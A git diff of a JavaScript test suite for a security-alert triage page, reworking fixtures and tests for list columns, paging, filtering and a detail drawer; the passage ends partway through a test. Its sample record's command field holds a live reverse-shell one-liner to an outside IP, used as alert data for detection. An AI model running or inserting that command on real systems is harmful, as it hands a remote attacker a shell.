@@ -1,9 +1,17 @@
-// pages/alerts.js —— 告警页六格状态矩阵 + 表格字段 + 分页 + 选择/批量 + 抽屉 + 队列开关
-// 字段一律照接口真名（cloudwalker.js:31-56 的 normalizeAlert / triage-monitor.js:91-96 的 status）。
+// pages/alerts.js —— 研判记录主列表（P003-T015）：六格状态矩阵 + 列字段 + 筛选/排序下推 + 误报
+//
+// 断言口径（D020 / A2 / A4）：
+//   - 一行就是一条研判记录，重复投递合成一行（repeat_count 沿用记录，不另造计数）；
+//   - 点误报 → 这一行马上变误报、理由留在记录上，维护状态另标；
+//   - 主列表**不请求 /api/alerts**（牧云没配时主列表不 503）；
+//   - 队列条读不到只让队列条显示「状态不可用」，列表照常。
 import { test, beforeEach } from 'node:test';
+import { readFileSync } from 'node:fs';
 import assert from 'node:assert/strict';
 
-import { formatTime, mountAlertsPage, triageStatusOf, verdictOf } from '../../pages/alerts.js';
+import {
+  formatEventTime, maintenanceText, mountAlertsPage, repeatOf, typeLabelOf, verdictOf,
+} from '../../pages/alerts.js';
 import { setCredentials, clearCredentials } from '../../src/credentials.js';
 import { flush, setupDom, text } from '../dom.js';
 
@@ -16,22 +24,42 @@ beforeEach(() => {
 });
 
 const SUMMARY = {
-  initialized: true, enabled: true, input_mode: 'syslog', last_poll_at: null, last_error: null,
+  initialized: true, enabled: true, input_mode: 'syslog', last_poll_at: null,
+  last_received_at: '2026-11-18T10:00:00.000Z', last_error: null,
   counts: { queued: 2, running: 1, done: 9, failed: 1 },
 };
 
-/** 一行的真实形状（取自 normalizeAlert 的返回键） */
-function alert(overrides = {}) {
+/** 列表项的真实形状（triage-monitor.js:128-151 的 cases() 返回键） */
+function record(overrides = {}) {
   return {
-    id: 'revshell:1', eventType: 'revshell', eventId: 1, hostId: 12,
-    createdAt: '2026-11-17T01:02:03.000Z', time: '09:02:03',
-    title: '反弹 Shell 外联', level: '高危', levelKey: 'high',
-    asset: 'web-prod-01', assetIp: '172.16.221.30',
-    source: '172.16.221.30', target: '45.9.1.2', account: 'root', command: 'bash -i',
-    verdict: '待研判', verdictKey: 'review', coverage: null, cases: 0,
-    scenario: '反弹 Shell', detail: '已从牧云读取原始事件；尚未执行 AI 研判。',
-    evidence: ['牧云 反弹 Shell 事件 #1'], gap: '待获取事件详情与关联证据',
-    state: null, triage: null,
+    alert_id: 'syslog:revshell:0123456789abcdef:1732000000:11111111-2222-3333-4444-555555555555',
+    matched_alert_id: null,
+    result_alert_id: null,
+    status: 'done',
+    stage: '研判完成',
+    detail: '研判记录已保存',
+    created_at: '2026-11-18T09:00:00.000Z',
+    updated_at: '2026-11-18T09:00:30.000Z',
+    saved_at: '2026-11-18T09:00:30.000Z',
+    case_dir: '/tmp/case',
+    repeat_count: 1,
+    verdict: 'threat',
+    verdict_label: '真实威胁',
+    summary: '反弹 Shell 外联，命令 bash -i 已落地',
+    report: null,
+    missing_evidence: [],
+    next_actions: [],
+    evidence_refs: [],
+    evidence: [{ evidence_id: 'syslog:1', tool: 'syslog', fetched_at: '2026-11-18T09:00:00.000Z', sha256: 'a'.repeat(64) }],
+    verified_facts: 2,
+    evidence_sources: 1,
+    msgid: 'cloudwalker-revshell',
+    decision_source: 'ai',
+    rule_id: null,
+    event_time: 1732000000,
+    host_ip: '10.0.0.5',
+    source_ip: '45.9.1.2',
+    command: 'bash -i >& /dev/tcp/45.9.1.2/4444 0>&1',
     ...overrides,
   };
 }
@@ -40,13 +68,11 @@ function respond(body, status = 200) {
   return { status, ok: status >= 200 && status < 300, json: async () => body };
 }
 
-const alertsPage = (body, status = 200) => respond(body, status);
-
 /**
- * 起页面。handler(url, init) 决定回什么；默认：告警列表照 alertsBody，队列照 SUMMARY。
- * @returns {{ host: HTMLElement, calls: {url:string, init:object}[] }}
+ * 起页面。handler(url, init) 可覆盖默认回包；默认：cases 照 casesBody，队列照 SUMMARY。
+ * @returns {{ host: HTMLElement, calls: {url:string, init:object}[], fetchImpl: Function }}
  */
-function mount({ alertsBody = { alerts: [alert()], total: 1 }, alertsStatus = 200, summary = SUMMARY, summaryStatus = 200, handler } = {}) {
+function mount({ casesBody = { total: 1, cases: [record()] }, casesStatus = 200, summary = SUMMARY, summaryStatus = 200, handler } = {}) {
   const calls = [];
   const fetchImpl = async (url, init) => {
     calls.push({ url: String(url), init });
@@ -55,661 +81,398 @@ function mount({ alertsBody = { alerts: [alert()], total: 1 }, alertsStatus = 20
       if (custom) return custom;
     }
     if (String(url).startsWith('/api/agent/triage/status')) return respond(summary, summaryStatus);
-    if (String(url).startsWith('/api/alerts')) return alertsPage(alertsBody, alertsStatus);
+    if (String(url).startsWith('/api/agent/triage/cases')) return respond(casesBody, casesStatus);
     return respond({ error: '未预期的请求' }, 500);
   };
-  const host = mountAlertsPage({ fetchImpl, now: () => new Date(2026, 10, 17, 9, 8, 7) });
+  const host = mountAlertsPage({ fetchImpl, now: () => new Date('2026-11-18T12:00:00.000Z') });
   document.body.append(host);
-  return { host, calls };
+  return { host, calls, fetchImpl };
 }
 
-const rows = host => [...host.querySelectorAll('tbody tr')];
-const cellsOf = row => [...row.querySelectorAll('td')].map(cell => text(cell));
-const buttonByName = (host, name) => [...host.querySelectorAll('button')].find(button => text(button) === name);
+const rows = host => [...host.querySelectorAll('[data-role="rows"] tr')];
+/** 只看列表请求（队列请求与它并发，谁最后落不确定） */
+const caseCalls = calls => calls.filter(call => call.url.includes('/api/agent/triage/cases'));
+const cellText = (host, column) => rows(host).map(row => text(row.querySelector(column)));
 
-function check(host, index) {
-  const box = host.querySelectorAll('tbody tr')[index].querySelector('input[type="checkbox"]');
-  box.checked = true;
-  box.dispatchEvent(new dom.window.Event('change'));
-}
+beforeEach(() => { dom = setupDom(); });
 
-// ---------- 六格状态矩阵 ----------
-
-test('格 1「加载中」：先出「正在读取告警…」+ aria-busy，刷新禁用；取到数据后撤掉', async () => {
-  const { host } = mount();
-
-  // 同步就能看到的加载态（不发第二次渲染）
-  assert.equal(text(host.querySelector('tbody')), '正在读取告警…');
-  assert.equal(host.querySelector('.table-wrap').getAttribute('aria-busy'), 'true');
-  assert.equal(buttonByName(host, '刷新').disabled, true);
-
-  await flush();
-
-  assert.equal(host.querySelector('.table-wrap').hasAttribute('aria-busy'), false);
-  assert.equal(buttonByName(host, '刷新').disabled, false);
-  assert.equal(rows(host).length, 1);
-  assert.equal(host.querySelector('[data-role="stamp"]').textContent, '09:08:07');
-  assert.equal(text(host.querySelector('[data-role="total"]')), '1');
-});
-
-test('格 2「空」：total 0 时表内一行提示，翻页与全选都禁用', async () => {
-  const { host } = mount({ alertsBody: { alerts: [], total: 0 } });
-  await flush();
-
-  assert.equal(text(host.querySelector('tbody')), '暂无告警。');
-  assert.equal(buttonByName(host, '上一页').disabled, true);
-  assert.equal(buttonByName(host, '下一页').disabled, true);
-  assert.equal(host.querySelector('[data-role="select-all"]').disabled, true);
-  assert.equal(text(host.querySelector('[data-role="total"]')), '0');
-});
-
-test('格 3「部分失败」：partial 为真时出提示条，逐条列失败的类型与原因', async () => {
-  const { host } = mount({
-    alertsBody: { alerts: [alert()], total: 1, partial: true, errors: { honeypot: '牧云 /rpc 超时' } },
-  });
-  await flush();
-
-  const notice = host.querySelector('[data-role="partial"]');
-  assert.equal(notice.hidden, false);
-  assert.match(text(notice), /部分类型查询失败/);
-  assert.match(text(notice), /honeypot：牧云 \/rpc 超时/);
-});
-
-test('格 4「错误」：503 出提示块（区分「没配好」），重试按钮再取一次', async () => {
-  let attempt = 0;
-  const { host } = mount({
-    handler: url => {
-      if (!url.startsWith('/api/alerts')) return null;
-      attempt += 1;
-      return attempt === 1 ? respond({ error: 'CLOUDWALKER_URL 缺失' }, 503) : respond({ alerts: [alert()], total: 1 });
-    },
-  });
-  await flush();
-
-  const block = host.querySelector('[role="alert"]');
-  assert.ok(block, '错误态要有 role="alert"');
-  assert.match(text(block), /告警接口不可用/);
-  assert.doesNotMatch(text(block), /CLOUDWALKER_URL/, '不把服务端原文甩到界面上');
-
-  buttonByName(host, '重试').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(attempt, 2);
-  assert.equal(rows(host).length, 1);
-});
-
-test('格 4b「错误」：连不上与 401 的文案互不相同', async () => {
-  const offline = mount({ handler: () => { throw new Error('ECONNREFUSED'); } });
-  await flush();
-  assert.match(text(offline.host.querySelector('[role="alert"]')), /无法连接/);
-
-  const denied = mount({ alertsStatus: 401 });
-  await flush();
-  assert.match(text(denied.host.querySelector('[role="alert"]')), /登录已失效/);
-});
-
-test('格 5「超长内容」：标题与 ID 原样进 textContent/title（截断交给 CSS），不丢字', async () => {
-  const longTitle = `可疑进程 ${'很长'.repeat(60)}`;
-  const longId = `suspicious_operation:${'9'.repeat(40)}`;
-  const { host } = mount({ alertsBody: { alerts: [alert({ id: longId, title: longTitle })], total: 1 } });
-  await flush();
-
-  const titleButton = host.querySelector('.cell-title');
-  assert.equal(text(titleButton), longTitle);
-  assert.equal(titleButton.getAttribute('title'), longTitle);
-  assert.equal(text(host.querySelector('.cell-id')), longId);
-});
-
-test('格 6「禁用」：队列暂停时开关变「恢复」；排队中/研判中的抽屉按钮禁用并显示当前状态', async () => {
-  const { host } = mount({
-    alertsBody: {
-      alerts: [alert({ triage: { status: 'running', stage: '研判中' } }), alert({ id: 'webshell:2', eventId: 2 })],
-      total: 2,
-    },
-    summary: { ...SUMMARY, enabled: false },
-  });
-  await flush();
-
-  assert.equal(text(host.querySelector('[data-role="qstate"]')), '自动研判 已暂停');
-  assert.ok(host.querySelector('[data-role="qstate"]').classList.contains('is-paused'));
-  const toggle = buttonByName(host, '恢复');
-  assert.ok(toggle, '暂停时按钮文案应为「恢复」');
-
-  host.querySelectorAll('.cell-title')[0].dispatchEvent(new dom.window.Event('click'));
-  const drawerButton = host.querySelector('[data-role="drawer-queue"]');
-  assert.equal(drawerButton.disabled, true);
-  assert.equal(text(drawerButton), '研判中');
-});
-
-// ---------- 表格字段只来自接口 ----------
-
-test('表格：十列齐全，每格取接口字段；空值显示「—」；不拿 alert.verdict 当结论', async () => {
-  const { host } = mount({
-    alertsBody: {
-      alerts: [
-        alert({ triage: { status: 'done', verdict_label: '真实威胁', verified_facts: 3, evidence_sources: 2, report: '结论正文' } }),
-        alert({ id: 'webshell:2', eventId: 2, assetIp: null, hostId: null, createdAt: null, level: '中危', levelKey: 'medium', scenario: 'WebShell' }),
-      ],
-      total: 2,
-    },
-  });
-  await flush();
-
-  assert.equal(text(host.querySelector('thead')), '等级 告警 ID 告警 类型 资产 IP 研判状态 结论 时间↓');
-  const [first, second] = rows(host).map(cellsOf);
-  assert.equal(first.length, 10);
-  assert.equal(first[1], '高危');
-  assert.equal(first[2], 'revshell:1');
-  assert.equal(first[3], '反弹 Shell 外联');
-  assert.equal(first[4], '反弹 Shell', '类型列取接口 scenario');
-  assert.equal(first[5], 'web-prod-01');
-  assert.equal(first[6], '172.16.221.30');
-  assert.equal(first[7], '完成');
-  assert.equal(first[8], '真实威胁');
-  assert.match(first[9], /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);
-
-  assert.equal(second[6], '—', 'assetIp 为 null → —');
-  assert.equal(second[8], '—', '没有 verdict_label → —（不显示 alert.verdict 的占位「待研判」）');
-  assert.equal(second[7], '未研判', '没有 triage → 未研判');
-  assert.equal(second[9], '—', 'createdAt 为 null → —');
-  assert.equal(text(host.querySelector('tbody')).includes('待研判'), false, '占位结论不得出现在表格里（筛选下拉的选项文案不算）');
-});
-
-test('A1/A2 正向钉：筛选条与排序按钮都在（P003-T007 后端已支持真参数），队列条仍不做「查看失败」', async () => {
-  const { host } = mount();
-  await flush();
-
-  assert.equal(host.querySelectorAll('select').length, 5, '类型/等级/结论/研判状态/时间范围五个下拉');
-  assert.equal(host.querySelectorAll('input[type="search"]').length, 1, '搜索框');
-  assert.equal(host.querySelectorAll('th button[data-sort]').length, 2, '等级与时间两个排序按钮');
-  assert.equal(host.querySelector('th.col-time').getAttribute('aria-sort'), 'descending');
-  assert.equal(host.textContent.includes('查看 1 条失败'), false, '队列条不渲染「查看失败」（用研判状态筛选代替）');
-});
-
-// ---------- 分页 ----------
-
-test('分页：请求只带 count/offset；下一页 +20；每页 50 回到第一页；页数按 total 算', async () => {
-  const { host, calls } = mount({ alertsBody: { alerts: [alert()], total: 45 } });
-  await flush();
-
-  const alertCalls = () => calls.filter(call => call.url.startsWith('/api/alerts')).map(call => call.url);
-  assert.deepEqual(alertCalls(), ['/api/alerts?count=20&offset=0&sort=time']);
-  assert.equal(text(host.querySelector('[data-role="pager-info"]')), '1–1 / 45 条 · 共 3 页');
-
-  buttonByName(host, '下一页').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCalls().at(-1), '/api/alerts?count=20&offset=20&sort=time');
-
-  buttonByName(host, '50').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCalls().at(-1), '/api/alerts?count=50&offset=0&sort=time');
-  assert.equal(host.querySelector('[data-role="size-50"]').getAttribute('aria-pressed'), 'true');
-  assert.equal(host.querySelector('[data-role="size-20"]').getAttribute('aria-pressed'), 'false');
-
-  buttonByName(host, '上一页').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCalls().length, 3, '已经在第一页时不再发请求');
-});
-
-test('分页：总页数缩水时游标拉回最后一页并重拉一次（页脚与行区不许打架）', async () => {
-  // 第 20 页请求（offset 380）时后端只剩 300 条 → 页数 15 → 游标拉回 280，且必须重拉那一页
-  let shrunk = false;
+test('默认态：一行一条研判记录，列照 D020（类型/主机/时间/结论/重复/命中规则/维护/状态）', async () => {
   const { host, calls } = mount({
-    handler: url => {
-      if (!url.startsWith('/api/alerts')) return null;
-      const offset = Number(new URL(url, 'http://localhost').searchParams.get('offset'));
-      const total = shrunk ? 300 : 400;
-      return respond({ alerts: offset >= total ? [] : [alert({ id: `revshell:${offset + 1}` })], total });
-    },
-  });
-  await flush();
-  const alertCalls = () => calls.filter(call => call.url.startsWith('/api/alerts')).map(call => call.url);
-  const pageButton = label => [...host.querySelectorAll('[data-role="page-numbers"] button')]
-    .find(button => text(button) === label);
-
-  shrunk = true;
-  pageButton('20').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-
-  assert.deepEqual(alertCalls(), [
-    '/api/alerts?count=20&offset=0&sort=time',
-    '/api/alerts?count=20&offset=380&sort=time',
-    '/api/alerts?count=20&offset=280&sort=time',
-  ], '游标被拉回后必须重拉一次，不能只改游标');
-  assert.equal(text(host.querySelector('[data-role="pager-info"]')), '281–281 / 300 条 · 共 15 页');
-  assert.equal(rows(host).length, 1, '行区要显示拉回后那一页的数据，不是空行');
-  assert.equal(text(host.querySelector('[data-role="page-numbers"] [aria-current="page"]')), '15');
-
-  // 游标没被改动时（正常刷新）不多打一轮
-  buttonByName(host, '刷新').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.deepEqual(alertCalls().slice(3), ['/api/alerts?count=20&offset=280&sort=time']);
-});
-
-// ---------- 筛选与排序（P003-T007 回填：真参数下推） ----------
-
-const select = (host, role, value) => {
-  const node = host.querySelector(`[data-role="${role}"]`);
-  node.value = value;
-  node.dispatchEvent(new dom.window.Event('change'));
-};
-
-const alertCallsOf = calls => calls.filter(call => call.url.startsWith('/api/alerts')).map(call => call.url);
-
-test('筛选条：稿上的五个控件都在（搜索 + 类型/等级/结论/研判状态 + 时间范围），各有可访问名', async () => {
-  const { host } = mount();
-  await flush();
-  assert.ok(host.querySelector('[data-role="filter-q"]').getAttribute('aria-label'), '搜索框要有可访问名');
-  const names = ['filter-type', 'filter-level', 'filter-verdict', 'filter-triage', 'filter-time']
-    .map(role => host.querySelector(`[data-role="${role}"]`).getAttribute('aria-label'));
-  assert.deepEqual(names, ['按事件类型筛选', '按等级筛选', '按研判结论筛选', '按研判状态筛选', '按时间范围筛选']);
-  const group = host.querySelector('.filters');
-  assert.equal(group.getAttribute('role'), 'group');
-});
-
-test('筛选：选类型回第一页重取，请求带 type，结果计数与清除按钮出现', async () => {
-  const { host, calls } = mount({ alertsBody: { alerts: [alert()], total: 45 } });
-  await flush();
-  buttonByName(host, '下一页').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=20&sort=time');
-
-  select(host, 'filter-type', 'webshell');
-  await flush();
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=0&type=webshell&sort=time', '筛选后页码回第一页');
-  assert.equal(host.querySelector('[data-role="clear-filters"]').hidden, false);
-  assert.equal(text(host.querySelector('[data-role="filter-count"]')), '筛选后 45 条');
-});
-
-test('筛选：四个下拉都映射成接口枚举（等级四档、状态含未研判、结论含待研判）', async () => {
-  const cases = [
-    ['filter-level', 'critical', 'level=critical'],
-    ['filter-verdict', 'review', 'verdict=review'],
-    ['filter-triage', 'not_queued', 'triage_status=not_queued'],
-  ];
-  for (const [role, value, expected] of cases) {
-    const { host, calls } = mount();
-    await flush();
-    select(host, role, value);
-    await flush();
-    assert.match(alertCallsOf(calls).at(-1), new RegExp(expected.replace(/_/g, '_')), `${role} 应下发 ${expected}`);
-    dom = setupDom();
-  }
-});
-
-test('筛选：搜索框回车/失焦才发请求；空值不发 q', async () => {
-  const { host, calls } = mount();
-  await flush();
-  const input = host.querySelector('[data-role="filter-q"]');
-  input.value = ' deploy ';
-  input.dispatchEvent(new dom.window.Event('change'));
-  await flush();
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=0&q=deploy&sort=time');
-
-  input.value = '';
-  input.dispatchEvent(new dom.window.Event('change'));
-  await flush();
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=0&sort=time');
-});
-
-test('筛选：时间范围只算 from（to 不传），取数时按当前时刻算', async () => {
-  const { host, calls } = mount();
-  await flush();
-  select(host, 'filter-time', '24h');
-  await flush();
-  const url = alertCallsOf(calls).at(-1);
-  const from = new URL(url, 'http://localhost').searchParams.get('from');
-  // now = 2026-11-17 09:08:07（本地时区），回看 24 小时
-  assert.equal(from, new Date(new Date(2026, 10, 17, 9, 8, 7).getTime() - 24 * 3600 * 1000).toISOString());
-  assert.equal(new URL(url, 'http://localhost').searchParams.has('to'), false, 'to 不发（闭区间不传＝到现在）');
-});
-
-test('清除筛选：控件全复位、排序回 time、焦点回搜索框、重取无参数的那一页', async () => {
-  const { host, calls } = mount();
-  await flush();
-  select(host, 'filter-level', 'high');
-  await flush();
-  buttonByName(host, '清除筛选').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=0&sort=time');
-  for (const role of ['filter-type', 'filter-level', 'filter-verdict', 'filter-triage', 'filter-time']) {
-    assert.equal(host.querySelector(`[data-role="${role}"]`).value, '');
-  }
-  assert.equal(host.querySelector('[data-role="filter-q"]').value, '');
-  assert.equal(document.activeElement, host.querySelector('[data-role="filter-q"]'));
-  assert.equal(host.querySelector('[data-role="clear-filters"]').hidden, true);
-});
-
-test('排序：点等级走 sort=level，aria-sort 跟着换；同一列再点不发请求（接口没有方向参数）', async () => {
-  const { host, calls } = mount();
-  await flush();
-  const levelTh = host.querySelector('[data-role="th-level"]');
-  const timeTh = host.querySelector('[data-role="th-time"]');
-  assert.equal(timeTh.getAttribute('aria-sort'), 'descending');
-  assert.equal(levelTh.getAttribute('aria-sort'), 'none');
-
-  host.querySelector('[data-role="sort-level"]').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=0&sort=level');
-  assert.equal(levelTh.getAttribute('aria-sort'), 'descending');
-  assert.equal(timeTh.getAttribute('aria-sort'), 'none');
-  assert.equal(text(host.querySelector('[data-role="arrow-level"]')), '↓');
-
-  const before = alertCallsOf(calls).length;
-  host.querySelector('[data-role="sort-level"]').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCallsOf(calls).length, before, '同一列再点不能凭空发一轮请求');
-
-  host.querySelector('[data-role="sort-time"]').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-  assert.equal(alertCallsOf(calls).at(-1), '/api/alerts?count=20&offset=0&sort=time');
-});
-
-test('格 2「空态」：筛选无匹配时给「没有匹配的告警」+ 清除筛选，不写成「暂无告警」', async () => {
-  const { host } = mount({ alertsBody: { alerts: [], total: 0 } });
-  await flush();
-  select(host, 'filter-triage', 'failed');
-  await flush();
-  assert.match(text(rows(host)[0]), /没有匹配的告警/);
-  const clear = buttonByName(rows(host)[0], '清除筛选');
-  assert.ok(clear, '空态要提供退出筛选的入口');
-});
-
-test('格 3「partial」：truncated 真时提示只统计了扫描窗口，假时不出现', async () => {
-  const truncated = mount({ alertsBody: { alerts: [alert()], total: 500, truncated: true } });
-  await flush();
-  const notice = truncated.host.querySelector('[data-role="truncated"]');
-  assert.equal(notice.hidden, false);
-  assert.match(text(notice), /只统计了扫描窗口/);
-
-  dom = setupDom();
-  const plain = mount({ alertsBody: { alerts: [alert()], total: 3 } });
-  await flush();
-  assert.equal(plain.host.querySelector('[data-role="truncated"]').hidden, true);
-});
-
-test('格 6「disabled」：加载中筛选控件与刷新都禁用', async () => {
-  const { host } = mount();
-  // 不 flush：停在加载中
-  for (const role of ['filter-q', 'filter-type', 'filter-level', 'filter-verdict', 'filter-triage', 'filter-time']) {
-    assert.equal(host.querySelector(`[data-role="${role}"]`).disabled, true, `${role} 加载中应禁用`);
-  }
-  assert.equal(host.querySelector('[data-role="refresh"]').disabled, true);
-  await flush();
-  assert.equal(host.querySelector('[data-role="filter-q"]').disabled, false);
-});
-
-// ---------- 可访问名 ----------
-
-test('可访问名：队列条是可命名分组，行内复选框点名到告警 ID，全选框说明范围', async () => {
-  const { host } = mount();
-  await flush();
-
-  const strip = host.querySelector('[data-role="queue"]');
-  assert.equal(strip.getAttribute('role'), 'group', '无 role 的 div 上 aria-label 不会被读屏暴露');
-  assert.equal(strip.getAttribute('aria-label'), '自动研判队列');
-
-  assert.equal(host.querySelector('[data-role="select-all"]').getAttribute('aria-label'), '全选当前页');
-  assert.equal(host.querySelector('tbody input[type="checkbox"]').getAttribute('aria-label'), '选择告警 revshell:1');
-  assert.match(text(host.querySelector('caption')), /告警列表/);
-});
-
-// ---------- 选择与批量重新研判 ----------
-
-test('选择：勾行出现批量条；全选只作用于当前页；「重新研判所选」逐条 POST，跳过排队中/研判中', async () => {
-  const { host, calls } = mount({
-    alertsBody: {
-      alerts: [
-        alert(),
-        alert({ id: 'webshell:2', eventId: 2, triage: { status: 'running' } }),
-        alert({ id: 'malware:3', eventId: 3, triage: { status: 'queued' } }),
-      ],
-      total: 3,
-    },
+    casesBody: { total: 2, cases: [record(), record({ alert_id: 'syslog:honeypot:abcdef0123456789:1732000500:aaaabbbb-cccc-dddd-eeee-ffff00001111', msgid: 'cloudwalker-honeypot', verdict: null, verdict_label: null, status: 'queued', stage: '等待研判', rule_id: null, repeat_count: 3 })] },
   });
   await flush();
 
-  const bar = host.querySelector('[data-role="bulkbar"]');
-  assert.equal(bar.hidden, true);
+  assert.equal(text(host.querySelector('[data-role="total"]')), '2');
+  assert.equal(rows(host).length, 2);
+  assert.deepEqual(cellText(host, '.col-verdict'), ['真实威胁', '待研判']);
+  assert.deepEqual(cellText(host, '.col-type'), ['反弹 Shell', '蜜罐']);
+  assert.deepEqual(cellText(host, '.col-ip'), ['10.0.0.5', '10.0.0.5']);
+  assert.deepEqual(cellText(host, '.col-dup'), ['×1', '×3']);
+  assert.deepEqual(cellText(host, '.col-rule'), ['没有套上', '—']);
+  assert.deepEqual(cellText(host, '.col-state'), ['完成', '排队中']);
+  assert.equal(text(host.querySelector('[data-role="pager-info"]')), '1–2 / 2 条 · 共 1 页');
 
-  const selectAll = host.querySelector('[data-role="select-all"]');
-  selectAll.checked = true;
-  selectAll.dispatchEvent(new dom.window.Event('change'));
-  assert.equal(bar.hidden, false);
-  assert.equal(text(host.querySelector('[data-role="bulk-count"]')), '3');
-
-  buttonByName(host, '重新研判所选').dispatchEvent(new dom.window.Event('click'));
-  await flush();
-
-  const posts = calls.filter(call => call.init?.method === 'POST').map(call => call.url);
-  assert.deepEqual(posts, ['/api/agent/triage/revshell%3A1'], '只有未入队的那条被提交');
-  assert.equal(bar.hidden, true, '批量操作后清除选择');
-  assert.ok(calls.some(call => call.url.startsWith('/api/alerts') && call.init?.method !== 'POST'),
-    '操作完重新取一次真实状态');
-});
-
-test('选择：全选后取消全选只清当前页的选中项', async () => {
-  const { host } = mount({
-    alertsBody: { alerts: [alert(), alert({ id: 'webshell:2', eventId: 2 })], total: 2 },
-  });
-  await flush();
-
-  const selectAll = host.querySelector('[data-role="select-all"]');
-  selectAll.checked = true;
-  selectAll.dispatchEvent(new dom.window.Event('change'));
-  assert.equal(text(host.querySelector('[data-role="bulk-count"]')), '2');
-
-  check(host, 0);
-  host.querySelectorAll('tbody tr')[0].querySelector('input[type="checkbox"]').checked = false;
-  host.querySelectorAll('tbody tr')[0].querySelector('input[type="checkbox"]').dispatchEvent(new dom.window.Event('change'));
-  assert.equal(text(host.querySelector('[data-role="bulk-count"]')), '1');
-  assert.equal(selectAll.indeterminate, true);
-});
-
-// ---------- 抽屉 ----------
-
-test('抽屉：点标题打开，字段取接口；Esc 关闭且焦点回该行标题；详情链接指向告警详情路由', async () => {
-  const { host } = mount({
-    alertsBody: {
-      alerts: [alert({
-        triage: {
-          status: 'done', verdict_label: '存疑', verified_facts: 4, evidence_sources: 2, report: '需要补主机登录日志',
-          matched_alert_id: 'revshell:1',
-          steps: [{ stage: '规则评估', detail: '命中候选', at: '2026-11-17T01:03:00.000Z' }, { stage: '研判', detail: '完成' }],
-        },
-      })],
-      total: 1,
-    },
-  });
-  await flush();
-
-  const titleButton = host.querySelector('.cell-title');
-  titleButton.dispatchEvent(new dom.window.Event('click'));
-
-  const drawer = host.querySelector('[data-role="drawer"]');
-  assert.equal(drawer.hidden, false);
-  assert.equal(text(host.querySelector('[data-role="drawer-id"]')), 'revshell:1');
-  assert.equal(text(host.querySelector('[data-role="drawer-level"]')), '高危');
-  assert.equal(text(host.querySelector('[data-role="drawer-verdict"]')), '存疑');
-  assert.equal(text(host.querySelector('[data-role="drawer-report"]')), '需要补主机登录日志');
-  assert.equal(text(host.querySelector('[data-role="drawer-event"]')), '#1');
-  assert.equal(text(host.querySelector('[data-role="drawer-host"]')), '#12');
-  assert.equal(text(host.querySelector('[data-role="drawer-state"]')), '完成');
-  assert.match(text(host.querySelector('[data-role="drawer-evidence"]')), /已验证事实\s*4 条\s*证据来源\s*2 个/);
-  assert.equal(text(host.querySelector('[data-role="raw-level"]')), 'high');
-  assert.equal(text(host.querySelector('[data-role="raw-matched"]')), 'revshell:1');
-  assert.equal(host.querySelector('[data-role="drawer-steps-block"]').hidden, false);
-  assert.equal(host.querySelectorAll('[data-role="drawer-steps"] .step').length, 2);
-  assert.equal(host.querySelector('[data-role="drawer-detail"]').getAttribute('href'), '#/alert-detail/revshell%3A1');
-  assert.equal(document.activeElement, host.querySelector('[data-role="drawer-close"]'), '打开后焦点进抽屉');
-
-  drawer.dispatchEvent(new dom.window.KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
-  assert.equal(drawer.hidden, true);
-  assert.equal(document.activeElement, titleButton, '关闭后焦点回原行标题');
-});
-
-test('抽屉：没有步骤与结论时不渲染步骤区块，结论写「尚未产生研判结论」', async () => {
-  const { host } = mount();
-  await flush();
-
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
-  assert.equal(host.querySelector('[data-role="drawer-steps-block"]').hidden, true);
-  assert.equal(text(host.querySelector('[data-role="drawer-verdict"]')), '未研判');
-  assert.equal(text(host.querySelector('[data-role="drawer-report"]')), '该告警尚未产生研判结论。');
-  assert.match(text(host.querySelector('[data-role="drawer-evidence"]')), /已验证事实\s*0 条\s*证据来源\s*0 个/);
-});
-
-test('抽屉：研判失败且没有结论时，结论区写「研判失败」而不是「研判中」', async () => {
-  const { host } = mount({
-    alertsBody: {
-      alerts: [alert({
-        triage: {
-          status: 'failed', stage: '研判失败', detail: '牧云 MCP HTTP 404',
-          steps: [{ stage: '准备研判', detail: '正在读取牧云工具与提示词', at: '2026-11-17T01:02:05.000Z' }],
-        },
-      })],
-      total: 1,
-    },
-  });
-  await flush();
-
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
-  assert.equal(text(host.querySelector('[data-role="drawer-verdict"]')), '研判失败，暂无结论');
-  assert.equal(text(host.querySelector('[data-role="drawer-state"]')), '失败');
-  assert.equal(text(host.querySelector('[data-role="drawer-queue"]')), '重试');
-  assert.equal(host.querySelector('[data-role="drawer-queue"]').disabled, false);
-  assert.ok(host.querySelector('[data-role="drawer-steps"] .step').classList.contains('is-done'),
-    '失败任务的步骤不画成「处理中」');
-  const steps = text(host.querySelector('[data-role="drawer-steps"]'));
-  assert.match(steps, /准备研判/);
-  assert.match(steps, /正在读取牧云工具与提示词/);
-});
-
-test('抽屉「缺失证据」：done 态有值就显示（文案取接口数组，逐项不丢）', async () => {
-  const { host } = mount({
-    alertsBody: {
-      alerts: [alert({
-        triage: {
-          status: 'done', verdict_label: '存疑', verified_facts: 2, evidence_sources: 1,
-          missing_evidence: ['主机登录日志', '进程树'],
-        },
-      })],
-      total: 1,
-    },
-  });
-  await flush();
-
-  host.querySelector('.cell-title').dispatchEvent(new dom.window.Event('click'));
-  const missing = host.querySelector('[data-role="drawer-missing"]');
-  assert.equal(missing.hidden, false, 'done 且有 missing_evidence 时不该藏');
-  assert.equal(text(missing), '缺失证据：主机登录日志、进程树');
